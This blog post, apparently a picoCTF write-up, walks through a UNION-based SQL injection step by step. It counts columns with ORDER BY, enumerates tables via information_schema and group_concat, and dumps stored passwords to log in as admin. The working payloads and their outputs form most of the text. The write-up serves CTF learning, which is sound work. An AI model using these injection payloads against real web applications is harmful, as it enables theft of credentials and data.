---
layout: post
title: Picoctf SQL Injection 3
description: ""
category: Problem Set
tags: []
published: true
---

{% include JB/setup %}

### This one was harder

- No extrinsic debug warning/query error
- escaped_string() prevented conventional sql injections
- Data only accesbible through certain columns

### 1 - Basic querying
The main page had no option of being injected, but the id identifying section was bulletproof; there was a bug in which the query was not escaped by quotes, so injection was still possible! It used POSTMAN to generate URL parameters for cleaniness and yep, it worked. 
I used 

	ORDER BY 1
    ORDER BY 2
    ORDER BY...
    ORDER BY 7
    
Until it broke and gave me a `user not found` in html
Great, it had 7 columns!

### 2 - Selection
To maniuplate that, I used 


	NULL UNION SELECT 1,2,3,4,5,6,7
    
    
To figure out which data points were displayed given that query:

	<pre>User info for 2
	Display name: 4
	Location: 5
	E-mail: 7 </pre>
    
So I know know the columns: id was column 1, username was column 2, password was column 3

### 3 - Table Prefix
The problem was it had a third layer of protection: the table had a prefix!


	$query = "SELECT * FROM ${table_prefix}users WHERE id=$id";
	$result = mysqli_query($con, $query);


So now what? I wasn't able to do anything using SELECT without knowing the full table name. After extremely intense googling, I realized I can find the list of all the tables through this very simple query (sarcasm):


	NULL UNION ALL SELECT 1,2,3,4,5,6,group_concat(table_name) FROM 	information_schema.tables 


Which returned

	<pre>User info for 2
    Display name: 4
    Location: 5
    E-mail: CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TABLESPACES,TABLE_CONSTRAINTS,TABLE_PRIVILEGES,TRIGGERS,USER_PRIVILEGES,VIEWS,INNODB_BUFFER_PAGE,INNODB_TRX,INNODB_BUFFER_POOL_STATS,INNODB_LOCK_WAITS,INNODB_CMPMEM,INNODB_CMP,INNODB_LOCKS,INNODB_CMPMEM_RESET,INNODB_CMP_RESET,INNODB_BUFFER_PAGE_LRU,super_secret_users
    </pre>

Our table was `super_secret_users`...nailed it. That group_concat option took a while to figure out.

### 4 - Getting the password

Child's play. 

	NULL UNION ALL SELECT 1,2,3,4,5,6,group_concat(password) FROM super_secret_users 
    
    <pre>User info for 2
    Display name: 4
    Location: 5
    E-mail: not_the_flag_super_secret_admin_password,not_the_flag_super_secret_betty_password,not_the_flag_super_secret_cathy_password,not_the_flag_super_secret_dan_password
    </pre>
    
The end. `not_the_flag_super_secret_admin_password` was used to login to get the flag.